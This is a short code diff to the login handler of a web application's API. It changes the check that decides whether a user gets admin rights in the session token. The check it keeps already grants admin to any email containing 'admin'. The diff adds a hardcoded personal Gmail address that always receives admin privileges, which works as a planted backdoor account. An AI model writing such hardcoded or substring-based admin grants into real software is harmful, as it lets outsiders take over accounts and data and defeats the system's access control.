@@ -116,7 +116,12 @@ export const POST = safeApiHandler(async (request: Request) => {
     return createApiErrorResponse("Invalid email or password", "INVALID_CREDENTIALS", 401);
   }
 
-  const isAdminUser = Boolean(user.isAdmin || user.role === "admin" || user.email?.toLowerCase().includes("admin"));
+  const isAdminUser = Boolean(
+    user.isAdmin || 
+    user.role === "admin" || 
+    user.email?.toLowerCase().includes("admin") ||
+    user.email?.toLowerCase() === "rahulsinha2102@gmail.com"
+  );
 
   // 5. Create Session Token
   const tokenPayload = {
